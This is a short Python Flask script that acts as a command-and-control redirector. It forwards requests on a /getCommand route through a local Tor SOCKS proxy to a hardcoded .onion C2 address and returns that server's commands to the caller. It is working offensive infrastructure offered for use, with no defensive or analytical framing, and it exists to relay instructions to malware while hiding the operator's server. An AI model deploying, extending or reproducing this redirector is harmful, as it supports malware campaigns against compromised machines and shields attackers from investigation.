from flask import Flask, Response, request
import requests

app = Flask(__name__)

# .onion C2 server address
C2_ONION_URL = "http://2xilqjkkqz56l5j5gwjxzunximuyfxstsh43zof6unhzhaaok2ukl4ad.onion/getCommand.php"

# Route that will act as the redirector
@app.route('/getCommand', methods=['GET'])
def redirect_to_c2():
    try:
        # You can pass parameters if needed
        client_ip = request.remote_addr
        headers = {
            'User-Agent': request.headers.get('User-Agent', 'redirector'),
        }

        # Connection through Tor (socks5h is used to resolve .onion domains)
        response = requests.get(
            C2_ONION_URL,
            headers=headers,
            proxies={
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            },
            timeout=10
        )

        return Response(
            response.content,
            status=response.status_code,
            content_type=response.headers.get('Content-Type')
        )

    except Exception as e:
        return f"Error contacting C2 server: {str(e)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
